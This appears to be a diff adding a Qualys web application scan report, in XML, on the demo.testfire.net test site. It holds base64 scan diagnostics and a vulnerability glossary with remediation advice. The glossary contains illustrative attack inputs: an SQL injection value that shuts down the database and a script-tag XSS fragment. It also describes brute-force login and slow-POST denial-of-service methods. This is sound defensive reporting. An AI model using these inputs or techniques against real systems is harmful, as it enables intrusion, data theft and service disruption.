+Y3RvcjogZXN0aW1hdGVkIHRpbWUgPCAxIG1pbnV0ZSAoMSB0ZXN0cywgODYgaW5wdXRzKQpCYXRj
+aCAjNCBodHRwb3h5IGRldGVjdG9yOiAxIHZ1bG5zaWdzIHRlc3RzLCBjb21wbGV0ZWQgODYgIHJl
+cXVlc3RzLCAyIHNlY29uZHMuIENvbXBsZXRlZCA4NiByZXF1ZXN0cyBvZiA4NiBlc3RpbWF0ZWQg
+cmVxdWVzdHMgKDEwMCUpLiBBbGwgdGVzdHMgY29tcGxldGVkLgpCYXRjaCAjNCBodHRwb3h5IGRl
+dGVjdG9yKGZvcm0pOiBlc3RpbWF0ZWQgdGltZSA8IDEgbWludXRlICgxIHRlc3RzLCAyIGlucHV0
+cykKQmF0Y2ggIzQgaHR0cG94eSBkZXRlY3Rvcihmb3JtKTogMSB2dWxuc2lncyB0ZXN0cywgY29t
+cGxldGVkIDIgIHJlcXVlc3RzLCAxIHNlY29uZHMuIENvbXBsZXRlZCAyIHJlcXVlc3RzIG9mIDIg
+ZXN0aW1hdGVkIHJlcXVlc3RzICgxMDAlKS4gQWxsIHRlc3RzIGNvbXBsZXRlZC4KQmF0Y2ggIzQg
+U3RydXRzIHRpbWViYXNlZCBkZXRlY3RvcjogZXN0aW1hdGVkIHRpbWUgPCAxIG1pbnV0ZSAoMSB0
+ZXN0cywgODYgaW5wdXRzKQpCYXRjaCAjNCBTdHJ1dHMgdGltZWJhc2VkIGRldGVjdG9yOiAxIHZ1
+bG5zaWdzIHRlc3RzLCBjb21wbGV0ZWQgODYgIHJlcXVlc3RzLCA0IHNlY29uZHMuIENvbXBsZXRl
+ZCA4NiByZXF1ZXN0cyBvZiA4NiBlc3RpbWF0ZWQgcmVxdWVzdHMgKDEwMCUpLiBBbGwgdGVzdHMg
+Y29tcGxldGVkLgpCYXRjaCAjNCBMb2dpbiBCcnV0ZSBGb3JjZSBtYW5pcHVsYXRpb246IGVzdGlt
+YXRlZCB0aW1lIDwgMzAgbWludXRlcyAoMTQ3MDAgdGVzdHMsIDEgaW5wdXRzKQpCYXRjaCAjNCBM
+b2dpbiBCcnV0ZSBGb3JjZSBtYW5pcHVsYXRpb246IDE0NzAwIHZ1bG5zaWdzIHRlc3RzLCBjb21w
+bGV0ZWQgNDM1ICByZXF1ZXN0cywgNTUzIHNlY29uZHMuIENvbXBsZXRlZCA0MzUgcmVxdWVzdHMg
+b2YgMTQ3MDAgZXN0aW1hdGVkIHJlcXVlc3RzICgyLjk1OTE4JSkuIE1vZHVsZSBkaWQgbm90IGZp
+bmlzaC4KQmF0Y2ggIzUgSFRUUCBUaW1lIEJhbmRpdDogZXN0aW1hdGVkIHRpbWUgPCAxIG1pbnV0
+ZSAoMSB0ZXN0cywgMTAgaW5wdXRzKQpCYXRjaCAjNSBIVFRQIFRpbWUgQmFuZGl0OiAxIHZ1bG5z
+aWdzIHRlc3RzLCBjb21wbGV0ZWQgMjAwICByZXF1ZXN0cywgMTUgc2Vjb25kcy4gTm8gdGVzdHMg
+dG8gZXhlY3V0ZS4KUGF0aCBtYW5pcHVsYXRpb246IEVzdGltYXRlZCByZXF1ZXN0cyAocGF5bG9h
+ZHMgeCBsaW5rcyk6IGZpbGVzIHdpdGggZXh0ZW5zaW9uOig0IHggNjYpICsgZmlsZXM6KDE1IHgg
+NjYpICsgIGRpcmVjdG9yaWVzOigxMDQgeCA5KSArICBwYXRoczooMTggeCA3NSkgPSB0b3RhbCAo
+MzU0MCkgCkJhdGNoICM1IFBhdGggbWFuaXB1bGF0aW9uOiBlc3RpbWF0ZWQgdGltZSA8IDEwIG1p
+bnV0ZXMgKDE0MSB0ZXN0cywgNzUgaW5wdXRzKQpCYXRjaCAjNSBQYXRoIG1hbmlwdWxhdGlvbjog
+MTQxIHZ1bG5zaWdzIHRlc3RzLCBjb21wbGV0ZWQgMTU1MiAgcmVxdWVzdHMsIDIwIHNlY29uZHMu
+IENvbXBsZXRlZCAxNTUyIHJlcXVlc3RzIG9mIDM1NDAgZXN0aW1hdGVkIHJlcXVlc3RzICg0My44
+NDE4JSkuIEFsbCB0ZXN0cyBjb21wbGV0ZWQuClRvdGFsIHJlcXVlc3RzIG1hZGU6IDE3MTk2CkF2
+ZXJhZ2Ugc2VydmVyIHJlc3BvbnNlIHRpbWU6IDAuMDggc2Vjb25kcwpNb3N0IHJlY2VudCBsaW5r
+czoKRmlyc3QgY29sdW1uIGluZGljYXRlcyBIVFRQIHJlc3BvbnNlIGNvZGUsCiBTcGVjaWFsIGNh
+c2VzOgogICAtVE86IFRoZSByZXF1ZXN0IHRpbWVkIG91dAogICAtQ0U6IFRoZSByZXF1ZXN0IGRp
+ZCBub3QgY29tcGxldGUgZHVlIHRvIGNvbm5lY3Rpb24gZXJyb3IpOgo0MDQgaHR0cDovL2RlbW8u
+dGVzdGZpcmUubmV0L2FsdG9yby9pbWFnZXMvLmdpdC9jb25maWcKNDA0IGh0dHA6Ly9kZW1vLnRl
+c3RmaXJlLm5ldC9zeXN0ZW0vCjQwNCBodHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvYmFuay9zeXN0
+ZW0vCjQwNCBodHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvYmFuay8yMDA2MDMwOF9iYWsvc3lzdGVt
+Lwo0MDEgaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2JhbmsvbWVtYmVycy9zeXN0ZW0vCjQwNCBo
+dHRwOi8vZGVtby50ZXN0ZmlyZS5uZXQvYWRtaW4vc3lzdGVtLwo0MDQgaHR0cDovL2RlbW8udGVz
+dGZpcmUubmV0L25vdGZvdW5kLmFzcHglM0Zhc3B4ZXJyb3JwYXRoPS9zeXN0ZW0vCjQwNCBodHRw
+Oi8vZGVtby50ZXN0ZmlyZS5uZXQvaW1hZ2VzL3N5c3RlbS8KNDA0IGh0dHA6Ly9kZW1vLnRlc3Rm
+aXJlLm5ldC9hbHRvcm8vc3lzdGVtLwo0MDQgaHR0cDovL2RlbW8udGVzdGZpcmUubmV0L2FsdG9y
+by9pbWFnZXMvc3lzdGVtLwo=
+]]></DATA>
+            </INFORMATION_GATHERED>
+            <INFORMATION_GATHERED>
+                <ID>245034724</ID>
+                <DETECTION_ID>1418109</DETECTION_ID>
+                <QID>150054</QID>
+                <LAST_TIME_DETECTED>21 Sep 2017 04:27PM GMT-0400</LAST_TIME_DETECTED>
+                <DATA base64="true"><![CDATA[TnVtYmVyIG9mIGVtYWlsczogMQpza2lwZmlzaEBleGFtcGxlLmNvbSBmaXJzdCBzZWVuIGF0IGh0
+dHA6Ly9kZW1vLnRlc3RmaXJlLm5ldC9zZWN1cml0eS5odG0K
+]]></DATA>
+            </INFORMATION_GATHERED>
+        </INFORMATION_GATHERED_LIST>
+    </RESULTS>
+    <GLOSSARY>
+        <QID_LIST>
+            <QID>
+                <QID>6</QID>
+                <CATEGORY>Information Gathered</CATEGORY>
+                <SEVERITY>1</SEVERITY>
+                <TITLE>DNS Host Name</TITLE>
+                <DESCRIPTION>The fully qualified domain name of this host, if it was obtained from a DNS server, is displayed in the RESULT section.</DESCRIPTION>
+                <IMPACT></IMPACT>
+                <SOLUTION></SOLUTION>
+            </QID>
+            <QID>
+                <QID>45017</QID>
+                <CATEGORY>Information Gathered</CATEGORY>
+                <SEVERITY>2</SEVERITY>
+                <TITLE>Operating System Detected</TITLE>
+                <DESCRIPTION><![CDATA[Several different techniques can be used to identify the operating system (OS) running on a host. A short description of these techniques is provided below. The specific technique used to identify the OS on this host is included in the RESULTS section of your report.
+<P>
+1) <B>TCP/IP Fingerprint</B>: The operating system of a host can be identified from a remote system using TCP/IP fingerprinting. All underlying operating system TCP/IP stacks have subtle differences that can be seen in their responses to specially-crafted TCP packets. According to the results of this "fingerprinting" technique, the OS version is among those listed below.
+<P>
+Note that if one or more of these subtle differences are modified by a firewall or a packet filtering device between the scanner and the host, the fingerprinting technique may fail. Consequently, the version of the OS may not be detected correctly. If the host is behind a proxy-type firewall, the version of the operating system detected may be that of the firewall instead of the host being scanned.
+<P>
+2) <B>NetBIOS</B>: Short for Network Basic Input Output System, an application programming interface (API) that augments the DOS BIOS by adding special functions for local-area networks (LANs). Almost all LANs for PCs are based on the NetBIOS. Some LAN manufacturers have even extended it, adding additional network capabilities. NetBIOS relies on a message format called Server Message Block (SMB).
+<P>
+3) <B>PHP Info</B>: PHP is a hypertext pre-processor, an open-source, server-side, HTML-embedded scripting language used to create dynamic Web pages. Under some configurations it is possible to call PHP functions like phpinfo() and obtain operating system information.
+<P>
+4) <B>SNMP</B>: The Simple Network Monitoring Protocol is used to monitor hosts, routers, and the networks to which they attach. The SNMP service maintains Management Information Base (MIB), a set of variables (database) that can be fetched by Managers. These include "MIB_II.system.sysDescr" for the operating system.
+]]></DESCRIPTION>
+                <IMPACT>Not  applicable.</IMPACT>
+                <SOLUTION>Not  applicable.</SOLUTION>
+            </QID>
+            <QID>
+                <QID>45038</QID>
+                <CATEGORY>Information Gathered</CATEGORY>
+                <SEVERITY>1</SEVERITY>
+                <TITLE>Host Scan Time</TITLE>
+                <DESCRIPTION><![CDATA[The Host Scan Time is the period of time it takes the scanning engine to perform the vulnerability assessment of a single target host. The Host Scan Time for this host is reported in the Result section below.
+<P>
+The Host Scan Time does not have a direct correlation to the Duration time as displayed in the Report Summary section of a scan results report. The Duration is the period of time it takes the service to perform a scan task. The Duration includes the time it takes the service to scan all hosts, which may involve parallel scanning. It also includes the time it takes for a scanner appliance to pick up the scan task and transfer the results back to the service's Secure Operating Center. Further, when a scan task is distributed across multiple scanners, the Duration includes the time it takes to perform parallel host scanning on all scanners.
+<P>
+For host running the Qualys Windows agent this QID reports the time taken by the agent to collect the host metadata used for the most recent assessment scan.]]></DESCRIPTION>
+                <IMPACT>N/A</IMPACT>
+                <SOLUTION>N/A</SOLUTION>
+            </QID>
+            <QID>
+                <QID>150001</QID>
+                <CATEGORY>Confirmed Vulnerability</CATEGORY>
+                <SEVERITY>5</SEVERITY>
+                <TITLE>Reflected Cross-Site Scripting (XSS) Vulnerabilities</TITLE>
+                <GROUP>XSS</GROUP>
+                <OWASP>A3</OWASP>
+                <WASC>WASC-8</WASC>
+                <CWE>CWE-79</CWE>
+                <CVSS_BASE>4.3</CVSS_BASE>
+                <CVSS_TEMPORAL>3.9</CVSS_TEMPORAL>
+                <DESCRIPTION><![CDATA[XSS vulnerabilities occur when the Web application echoes user-supplied data in an HTML response sent to the Web browser. For example, a Web application might include the user's name as part of a welcome message or display a home address when confirming a shipping destination. If the user-supplied data contain characters that are interpreted as part of an HTML element instead of literal text, then an attacker can modify the HTML that is received by the victim's Web browser.
+<P>
+The XSS payload is echoed in HTML document returned by the request. An XSS payload may consist of HTML, JavaScript or other content that will be rendered by the browser. In order to exploit this vulnerability, a malicious user would need to trick a victim into visiting the URL with the XSS payload.]]></DESCRIPTION>
+                <IMPACT>XSS exploits pose a significant threat to a Web application, its users and user data. XSS exploits target the users of a Web application rather than the Web application itself. An exploit can lead to theft of the user's credentials and personal or financial information. Complex exploits and attack scenarios are possible via XSS because it enables an attacker to execute dynamic code. Consequently, any capability or feature available to the Web browser (for example HTML, JavaScript, Flash and Java applets) can be used to as a part of a compromise.</IMPACT>
+                <SOLUTION><![CDATA[Filter all data collected from the client including user-supplied content and browser content such as Referrer and User-Agent headers.
+<P>
+Any data collected from the client and displayed in a Web page should be HTML-encoded to ensure the content is rendered as text instead of an HTML element or JavaScript.]]></SOLUTION>
+            </QID>
+            <QID>
+                <QID>150003</QID>
+                <CATEGORY>Confirmed Vulnerability</CATEGORY>
+                <SEVERITY>5</SEVERITY>
+                <TITLE>SQL Injection</TITLE>
+                <GROUP>SQL</GROUP>
+                <OWASP>A1</OWASP>
+                <WASC>WASC-19</WASC>
+                <CWE>CWE-89</CWE>
+                <CVSS_BASE>10.0</CVSS_BASE>
+                <CVSS_TEMPORAL>8.6</CVSS_TEMPORAL>
+                <DESCRIPTION><![CDATA[SQL injection enables an attacker to modify the syntax of a SQL query in order to retrieve, corrupt or delete data. This is accomplished by manipulating query criteria in a manner that affects the query's logic. The typical causes of this vulnerability are lack of input validation and insecure construction of the SQL query.
+<P>
+Queries created by concatenating strings with SQL syntax and user-supplied data are prone to this vulnerability. If any part of the string concatenation can be modified, then the meaning of the query can be changed.
+<P>
+Examples:
+<BR>
+These two lines demonstrate an insecure query that is created by appending the user-supplied data (<B>userid</B>):<BR>
+<CODE>
+dim strQuery as String <BR>
+strQuery = "SELECT name,email FROM users WHERE userid=" + Request.QueryString("userid")
+</CODE>
+<P>
+If no checks are performed against the <B>userid</B> parameter, then the query may be arbitrarily modified as shown in these two examples of a completed query:<BR>
+<CODE>
+SELECT name,email FROM users WHERE userid=<U>42</U><BR>
+SELECT name,email FROM users WHERE userid=<U>42; SHUTDOWN WITH NOWAIT</U>
+</CODE>]]></DESCRIPTION>
+                <IMPACT>The scope of a SQL injection exploit varies greatly. If any SQL statement can be injected into the query, then the attacker has the equivalent access of a database administrator. This access could lead to theft of data, malicious corruption of data, or deletion of data.</IMPACT>
+                <SOLUTION><![CDATA[SQL injection vulnerabilities can be addressed in three areas: input validation, query creation, and database security.
+<P>
+All input received from the Web client should be validated for correct content. If a value's type or content range is known beforehand, then stricter filters should be applied. For example, an email address should be in a specific format and only contain characters that make it a valid address; or numeric fields like a U.S. zip code should be limited to five digit values.
+<P>
+Prepared statements (sometimes referred to as parameterized statements) provide strong protection from SQL injection. Prepared statements are precompiled SQL queries whose parameters can be modified when the query is executed. Prepared statements enforce the logic of the query and will fail if the query cannot be compiled correctly. Programming languages that support prepared statements provide specific functions for creating queries. These functions are more secure than string concatenation for assigning user-supplied data to a query.
+<P>
+Stored procedures are precompiled queries that reside in the database. Like prepared statements, they also enforce separation of query data and logic. SQL statements that call stored procedures should not be created via string concatenation, otherwise their security benefits are negated.
+<P>
+SQL injection exploits can be mitigated by the use of Access Control Lists or role-based access within the database. For example, a read-only account would prevent an attacker from modifying data, but would not prevent the user from viewing unauthorized data. Table and row-based access controls potentially minimize the scope of a compromise, but they do not prevent exploits.
+<P>
+Example of a secure query created with a prepared statement:
+<BR>
+<CODE>
+PreparedStatement ps = "SELECT name,email FROM users WHERE userid=?";
+ps.setInt(1, userid);
+</CODE>]]></SOLUTION>
+            </QID>
+            <QID>
+                <QID>150004</QID>
+                <CATEGORY>Confirmed Vulnerability</CATEGORY>
+                <SEVERITY>2</SEVERITY>
+                <TITLE>Path-Based Vulnerability</TITLE>
+                <GROUP>PATH</GROUP>
+                <OWASP>A4,A7</OWASP>
+                <WASC>WASC-16,WASC-17,WASC-15</WASC>
+                <CWE>CWE-22</CWE>
+                <CVSS_BASE>2.1</CVSS_BASE>
+                <CVSS_TEMPORAL>1.9</CVSS_TEMPORAL>
+                <DESCRIPTION>A potentially sensitive file, directory, or directory listing was discovered on the Web server.</DESCRIPTION>
+                <IMPACT>The contents of this file or directory may disclose sensitive information.</IMPACT>
+                <SOLUTION>Verify that access to this file or directory is permitted. If necessary, remove it or apply access controls to it.</SOLUTION>
+            </QID>
+            <QID>
+                <QID>150009</QID>
+                <CATEGORY>Information Gathered</CATEGORY>
+                <SEVERITY>1</SEVERITY>
+                <TITLE>Links Crawled</TITLE>
+                <DESCRIPTION>The list of unique links crawled and HTML forms submitted by the Web application scanner appear in the Results section. This list may contain fewer links than the maximum threshold defined at scan launch. The maximum links to crawl includes links in this list and requests for the same link made as an anonymous and authenticated user.</DESCRIPTION>
+                <IMPACT>N/A</IMPACT>
+                <SOLUTION>N/A</SOLUTION>
+            </QID>
+            <QID>
+                <QID>150010</QID>
+                <CATEGORY>Information Gathered</CATEGORY>
+                <SEVERITY>1</SEVERITY>
+                <TITLE>External Links Discovered</TITLE>
+                <DESCRIPTION>The external links discovered by the Web application scanning engine are provided in the Results section. These links were present on the target Web application, but were not crawled.</DESCRIPTION>
+                <IMPACT>N/A</IMPACT>
+                <SOLUTION>N/A</SOLUTION>
+            </QID>
+            <QID>
+                <QID>150013</QID>
+                <CATEGORY>Confirmed Vulnerability</CATEGORY>
+                <SEVERITY>5</SEVERITY>
+                <TITLE>Browser-Specific Cross-Site Scripting Vulnerabilities</TITLE>
+                <GROUP>XSS</GROUP>
+                <OWASP>A3</OWASP>
+                <WASC>WASC-8</WASC>
+                <CWE>CWE-79</CWE>
+                <CVSS_BASE>4.3</CVSS_BASE>
+                <CVSS_TEMPORAL>4.3</CVSS_TEMPORAL>
+                <DESCRIPTION><![CDATA[XSS vulnerabilities occur when the Web application echoes user-supplied data in an HTML response sent to the Web browser. For example, a Web application might include the user's name as part of a welcome message or display a home address when confirming a shipping destination. If the user-supplied data contains characters that are interpreted as part of an HTML element instead of literal text, then an attacker can modify the HTML that is received by the victim's Web browser.
+<P>
+The XSS payload is echoed in the HTML document returned by the request. An XSS payload may consist of HTML, JavaScript or other content that will be rendered by the browser. In order to exploit this vulnerability, a malicious user would need to trick a victim into visiting the URL with the XSS payload.
+<P>
+Note! This specific test uses an XSS payload that takes advantage of Mozilla's HTML parsing engine. Manual confirmation of this vulnerability should use the Mozilla browser. Even though this exploits a particular Web browser, the Web application still has inadequate input filters.]]></DESCRIPTION>
+                <IMPACT>XSS exploits pose a significant threat to a Web application, its users and user data. XSS exploits target the users of a Web application rather than the Web application itself. An exploit can lead to theft of the user's credentials and personal or financial information. Complex exploits and attack scenarios are possible via XSS because it enables an attacker to execute dynamic code in the victim's Web browser. Consequently, any capability or feature available to the Web browser (for example HTML, JavaScript, Flash, and Java applets) can be used as part of a compromise.</IMPACT>
+                <SOLUTION><![CDATA[Filter all data collected from the client including user-supplied content and browser content such as Referrer and User-Agent headers.
+<P>
+Any data collected from the client and displayed in a Web page should be HTML-encoded to ensure the content is rendered as text instead of an HTML element or JavaScript.]]></SOLUTION>
+            </QID>
+            <QID>
+                <QID>150021</QID>
+                <CATEGORY>Information Gathered</CATEGORY>
+                <SEVERITY>1</SEVERITY>
+                <TITLE>Scan Diagnostics</TITLE>
+                <DESCRIPTION>This check provides various details of the scan's performance and behavior. In some cases, this check can be used to identify problems that the scanner encountered when crawling the target Web application.</DESCRIPTION>
+                <IMPACT>The scan diagnostics data provides technical details about the crawler's performance and behavior. This information does not necessarily imply problems with the Web application.</IMPACT>
+                <SOLUTION>No action is required.</SOLUTION>
+            </QID>
+            <QID>
+                <QID>150023</QID>
+                <CATEGORY>Confirmed Vulnerability</CATEGORY>
+                <SEVERITY>2</SEVERITY>
+                <TITLE>Directory Listing</TITLE>
+                <GROUP>PATH</GROUP>
+                <OWASP>A4,A5</OWASP>
+                <WASC>WASC-16</WASC>
+                <CWE>CWE-22</CWE>
+                <CVSS_BASE>5.0</CVSS_BASE>
+                <CVSS_TEMPORAL>4.5</CVSS_TEMPORAL>
+                <DESCRIPTION>The Web server presents a directory listing.</DESCRIPTION>
+                <IMPACT>All file names in this directory are exposed.</IMPACT>
+                <SOLUTION>The presence of a browseable directory does not necessarily imply a vulnerability. Determine if the directory listing is intended to be displayed. Verify that no files in the directory contain content that should not be served by the Web application.</SOLUTION>
+            </QID>
+            <QID>
+                <QID>150028</QID>
+                <CATEGORY>Information Gathered</CATEGORY>
+                <SEVERITY>1</SEVERITY>
+                <TITLE>Cookies Collected</TITLE>
+                <DESCRIPTION>The cookies listed in the Results section were received from the web application during the crawl phase.</DESCRIPTION>
+                <IMPACT>Cookies may contain sensitive information about the user. Cookies sent via HTTP may be sniffed.</IMPACT>
+                <SOLUTION>Review cookie values to ensure that sensitive information such as passwords are not present within them.</SOLUTION>
+            </QID>
+            <QID>
+                <QID>150042</QID>
+                <CATEGORY>Information Gathered</CATEGORY>
+                <SEVERITY>3</SEVERITY>
+                <TITLE>Server Returns HTTP 500 Message For Request</TITLE>
+                <OWASP>A6</OWASP>
+                <WASC>WASC-15</WASC>
+                <DESCRIPTION>During the scanning engine's crawl phase, the Web server responded with an HTTP 500 message for each link listed below. The HTTP 500 message indicates a server error.</DESCRIPTION>
+                <IMPACT>The presence of an HTTP 500 error during the crawl phase indicates that some problem exists in the Web site that will be encountered during normal usage of the Web application.</IMPACT>
+                <SOLUTION>Review each link to determine why the server encountered an error when responding to the link.</SOLUTION>
+            </QID>
+            <QID>
+                <QID>150049</QID>
+                <CATEGORY>Confirmed Vulnerability</CATEGORY>
+                <SEVERITY>4</SEVERITY>
+                <TITLE>Login Brute Force Vulnerability</TITLE>
+                <GROUP>INFO</GROUP>
+                <OWASP>A2</OWASP>
+                <WASC>WASC-11</WASC>
+                <CWE>CWE-285</CWE>
+                <CVSS_BASE>3.6</CVSS_BASE>
+                <CVSS_TEMPORAL>3.4</CVSS_TEMPORAL>
+                <DESCRIPTION><![CDATA[This vulnerability occurs when a malicious user succeeds to guess a valid username and password that will enable them to authenticate illicitly to a Web application.
+<P>
+The username and password would be "guessed" based on a generated list that can come from two sources: a user-defined configuration, or an internal list provided by the WAS module based on the most common usernames and passwords.]]></DESCRIPTION>
+                <IMPACT><![CDATA[The consequences will vary depending on which account the malicious user found. Obviously if the admin account has been found this way the consequences are much higher than a guest account.
+<P>
+Examples of consequences:<BR>
+Administration rights on the Web site<BR>
+Identity theft<BR>
+Access to critical business related data]]></IMPACT>
+                <SOLUTION><![CDATA[Implement a mechanism that will limit the number of attempts for a given username. This will prevent any brute forcer to test for more complex passwords.
+<P>
+Enforce a password policy that will make sure that the password is complex enough to prevent any easy guess (password equals username, or is a number, or a dictionary word). It is really important because if a password can be guessed in one attempt (for example, password equals username) then any limitation of number of attempts would useless.
+<P>
+It is recommended that a password has at least 8 characters containing numbers and special characters. Avoid replacing a letter that looks like a number by its corresponding number (for example, o with zero, e with 3) since many brute forcers do check for them.]]></SOLUTION>
+            </QID>
+            <QID>
+                <QID>150053</QID>
+                <CATEGORY>Confirmed Vulnerability</CATEGORY>
+                <SEVERITY>4</SEVERITY>
+                <TITLE>Login Form Is Not Submitted Via HTTPS </TITLE>
+                <GROUP>INFO</GROUP>
+                <OWASP>A2,A6</OWASP>
+                <CVSS_BASE>8.5</CVSS_BASE>
+                <CVSS_TEMPORAL>7.2</CVSS_TEMPORAL>
+                <DESCRIPTION>The login form's default action contains a link that is not submitted via HTTPS (HTTP over SSL).</DESCRIPTION>
+                <IMPACT>Sensitive data such as authentication credentials should be encrypted when transmitted over the network. Otherwise they are exposed to sniffing attacks.</IMPACT>
+                <SOLUTION>Change the login form's action to submit via HTTPS.</SOLUTION>
+            </QID>
+            <QID>
+                <QID>150054</QID>
+                <CATEGORY>Information Gathered</CATEGORY>
+                <SEVERITY>1</SEVERITY>
+                <TITLE>Email Addresses Collected</TITLE>
+                <GROUP>INFO</GROUP>
+                <DESCRIPTION>The email addresses listed in the Results section were collected from the returned HTML content during the crawl phase.</DESCRIPTION>
+                <IMPACT>Email addresses may help a malicious user with brute force and phishing attacks.</IMPACT>
+                <SOLUTION>Review the email list to see if they are all email addresses you want to expose.</SOLUTION>
+            </QID>
+            <QID>
+                <QID>150058</QID>
+                <CATEGORY>Information Gathered</CATEGORY>
+                <SEVERITY>1</SEVERITY>
+                <TITLE>Flash Analysis</TITLE>
+                <DESCRIPTION>This check provides various details on Flash analysis including problems encountered while handling SWF files.</DESCRIPTION>
+                <IMPACT>N/A</IMPACT>
+                <SOLUTION>No action is required.</SOLUTION>
+            </QID>
+            <QID>
+                <QID>150059</QID>
+                <CATEGORY>Potential Vulnerability</CATEGORY>
+                <SEVERITY>1</SEVERITY>
+                <TITLE>Reference to Windows file path is present in HTML</TITLE>
+                <GROUP>INFO</GROUP>
+                <CVSS_BASE>5.0</CVSS_BASE>
+                <CVSS_TEMPORAL>3.8</CVSS_TEMPORAL>
+                <DESCRIPTION>Windows specific file path was detected in the response.</DESCRIPTION>
+                <IMPACT>The response may be an error response that disclosed a local file path. This may potentially be a sensitive information.</IMPACT>
+                <SOLUTION>The content should be reviewed to determine whether it could be masked or removed.</SOLUTION>
+            </QID>
+            <QID>
+                <QID>150076</QID>
+                <CATEGORY>Confirmed Vulnerability</CATEGORY>
+                <SEVERITY>4</SEVERITY>
+                <TITLE>DOM-Based Cross-Site Scripting (XSS)</TITLE>
+                <GROUP>XSS</GROUP>
+                <OWASP>A3</OWASP>
+                <WASC>WASC-8</WASC>
+                <CWE>CWE-79</CWE>
+                <CVSS_BASE>4.3</CVSS_BASE>
+                <CVSS_TEMPORAL>3.7</CVSS_TEMPORAL>
+                <DESCRIPTION><![CDATA[This is a type of HTML injection that delivers an attack payload via a property of the browser's Document Object Model (DOM). The DOM represents the rendered form of a site's web page, such as frames, tables, forms, and text. The vulnerability occurs because a web page uses JavaScript to update the DOM with an attacker-influenced value that either changes the DOM's layout or executes JavaScript of the attacker's choosing.
+
+The following example demonstrates a DOM property, document.location, that is used to update the DOM via document.write. The exploit succeeds because the browser interprets the output of document.write as HTML, which the attacker uses to inject a <script> tag. Because the XSS payload follows a page fragment (the # character), the payload is not sent to the server and will not be detectable by the server-side web application:
+
+  http://web.site/index.html#<script>alert(42)</script>
+
+Vulnerable web page:
+
+  <SCRIPT>
+         var currentLink = document.location;
+         document.write("You clicked on " + currentLink);
+  </SCRIPT>
+
+Other XSS vulnerabilities occur when the Web application echoes user-supplied data in an HTML response sent to the Web browser. For example, a Web application might include the user's name as part of a welcome message, or display a home address when confirming a shipping destination. If the user-supplied data contains characters that are interpreted as part of an HTML element instead of literal text, then an attacker can modify the HTML that is received by the victim's Web browser.
+]]></DESCRIPTION>
+                <IMPACT>XSS exploits pose a significant threat to a Web application, its users and user data. XSS exploits target the users of a Web application rather than the Web application itself. An exploit can lead to theft of the user's credentials and personal or financial information. Complex exploits and attack scenarios are possible via XSS because it enables an attacker to execute dynamic code. Consequently, any capability or feature available to the Web browser (for example HTML, JavaScript, Flash and Java applets) can be used as part of a compromise.</IMPACT>
+                <SOLUTION><![CDATA[Client-side JavaScript that uses document.write or otherwise modifies the DOM based on DOM properties such as document.location or window.location.href should filter content to ensure it does not contain malicious characters.
+<P>
+Any data collected from the client and displayed in a Web page should be HTML-encoded to ensure the content is rendered as text instead of an HTML element or JavaScript.
+<P>
+More information can be found at the <A HREF="http://www.owasp.org/index.php/DOM_Based_XSS" TARGET="_blank">OWASP community site</A>.]]></SOLUTION>
+            </QID>
+            <QID>
+                <QID>150081</QID>
+                <CATEGORY>Potential Vulnerability</CATEGORY>
+                <SEVERITY>1</SEVERITY>
+                <TITLE>Clickjacking - X-Frame-Options header is not set</TITLE>
+                <GROUP>INFO</GROUP>
+                <CVSS_BASE>5.0</CVSS_BASE>
+                <CVSS_TEMPORAL>4.1</CVSS_TEMPORAL>
+                <DESCRIPTION><![CDATA[X-Frame-Options header is not set, and that may lead to a possible framing of the page.
+An attacker can trick the user into clicking on the link by framing the original page and showing a layer on top of it with dummy buttons.
+]]></DESCRIPTION>
+                <IMPACT><![CDATA[Attacks like Clickjacking and Cross-Site Request Forgery (CSRF) could be performed.
+]]></IMPACT>
+                <SOLUTION><![CDATA[Set the X-Frame-Options: This header works with modern browsers and can be used to prevent framing of the page. Note that it must be an HTTP header, the setting is ignored if it is created as an "http-equiv" meta element within the page.
+]]></SOLUTION>
+            </QID>
+            <QID>
+                <QID>150084</QID>
+                <CATEGORY>Potential Vulnerability</CATEGORY>
+                <SEVERITY>1</SEVERITY>
+                <TITLE>Unencoded characters </TITLE>
+                <GROUP>XSS</GROUP>
+                <OWASP>A3</OWASP>
+                <WASC>WASC-20</WASC>
+                <CWE>CWE-79</CWE>
+                <DESCRIPTION>The web application reflects potentially dangerous characters such as single quotes, double quotes, and angle brackets. These characters are commonly used for HTML injection attacks such as cross-site scripting (XSS).</DESCRIPTION>
+                <IMPACT>No exploit was determined for these reflected characters. The input parameter should be manually analyzed to verify that no other characters can be injected that would lead to an HTML injection (XSS) vulnerability.</IMPACT>
+                <SOLUTION>Review the reflected characters to ensure that they are properly handled as defined by the web application's coding practice. Typical solutions are to apply HTML encoding or percent encoding to the characters depending on where they are placed in the HTML. For example, a double quote might be encoded as " when displayed in a text node, but as %22 when placed in the value of an href attribute.</SOLUTION>
+            </QID>
+            <QID>
+                <QID>150085</QID>
+                <CATEGORY>Potential Vulnerability</CATEGORY>
+                <SEVERITY>3</SEVERITY>
+                <TITLE>Slow HTTP POST vulnerability</TITLE>
+                <GROUP>INFO</GROUP>
+                <OWASP>A5</OWASP>
+                <CVSS_BASE>6.8</CVSS_BASE>
+                <CVSS_TEMPORAL>6.1</CVSS_TEMPORAL>
+                <DESCRIPTION><![CDATA[The web application is possibly vulnerable to a "slow HTTP POST" Denial of Service (DoS) attack. This is an application-level DoS that consumes server resources by maintaining open connections for an extended period of time by slowly sending traffic to the server. If the server maintains too many connections open at once, then it may not be able to respond to new, legitimate connections. Unlike bandwidth-consumption DoS attacks, the "slow" attack does not require a large amount of traffic to be sent to the server -- only that the client is able to maintain open connections for several minutes at a time.
+<P>
+The attack holds server connections open by sending properly crafted HTTP POST headers that contain a Content-Length header with a large value to inform the web server how much of data to expect. After the HTTP POST headers are fully sent, the HTTP POST message body is sent at slow speeds to prolong the completion of the connection and lock up server resources. By waiting for the complete request body, the server is helping clients with slow or intermittent connections to complete requests, but is also exposing itself to abuse.
+<P>
+Further information can be found under <A HREF="https://media.blackhat.com/bh-dc-11/Brennan/BlackHat_DC_2011_Brennan_Denial_Service-Slides.pdf" TARGET="_blank">BlackHat_DC_2011_Brennan_Denial_Service-Slides.pdf</A>. ]]></DESCRIPTION>
+                <IMPACT>All other services remain intact but the web server itself becomes inaccessible.</IMPACT>
+                <SOLUTION><![CDATA[Solution would be server-specific, but general recommendations are:
+- to limit the size of the acceptable request to each form requirements
+- establish minimal acceptable speed rate
+- establish absolute request timeout for connection with POST request
